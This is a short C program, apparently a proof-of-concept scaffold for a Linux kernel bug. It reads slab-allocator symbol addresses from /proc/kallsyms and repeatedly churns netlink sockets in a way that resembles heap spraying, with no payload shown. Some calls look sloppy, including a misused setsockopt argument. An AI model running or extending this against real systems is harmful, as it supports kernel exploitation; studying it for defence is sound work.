#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netlink.h>

static void probe_kernel_syms(void)
{
	const char *syms[] = {
		"__kfree_rcu_sheaf",
		"kfree_rcu_sheaf",
		"kmalloc_caches",
		"slub_kworker",
	};
	char line[512];
	FILE *f = fopen("/proc/kallsyms", "r");
	if (!f) { printf("SYM kallsyms unreadable errno=%d\n", errno); return; }
	while (fgets(line, sizeof(line), f)) {
		char addr[32], type, name[256];
		if (sscanf(line, "%31s %c %255s", addr, &type, name) != 3)
			continue;
		for (unsigned i = 0; i < sizeof(syms) / sizeof(syms[0]); i++) {
			if (!strcmp(name, syms[i]))
				printf("SYM %-24s %s\n", name, addr);
		}
	}
	fclose(f);
}

static int make_netlink(int proto)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, proto);
	if (fd < 0)
		return -1;
	struct sockaddr_nl sa;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = getpid() + proto * 1000;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}

int main(void)
{
	printf("POC start uid=%d\n", getuid());
	probe_kernel_syms();

	int ok = 0;
	for (int proto = 0; proto < 32; proto++) {
		int fd = socket(AF_NETLINK, SOCK_RAW, proto);
		if (fd < 0) continue;
		struct sockaddr_nl sa;
		memset(&sa, 0, sizeof(sa));
		sa.nl_family = AF_NETLINK;
		unsigned char groups[128];
		for (int g = 0; g < 128; g++) {
			socklen_t len = sizeof(groups);
			if (getsockopt(fd, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS,
				       groups, &len) == 0 && len > 0)
				ok++;
		}
		close(fd);
	}
	printf("NETLINK sockopt_probe ok=%d\n", ok);

	for (int round = 0; round < 64; round++) {
		for (int proto = 0; proto < 32; proto++) {
			int fd = make_netlink(proto);
			if (fd >= 0)
				close(fd);
		}
	}

	for (int proto = 0; proto < 32; proto++) {
		int fd = socket(AF_NETLINK, SOCK_RAW, proto);
		if (fd < 0) continue;
		struct sockaddr_nl sa;
		memset(&sa, 0, sizeof(sa));
		sa.nl_family = AF_NETLINK;
		sa.nl_groups = 0xffffffff;
		setsockopt(fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &sa, sizeof(sa));
		close(fd);
	}

	printf("POC done\n");
	printf("POC_OK\n");
	return 0;
}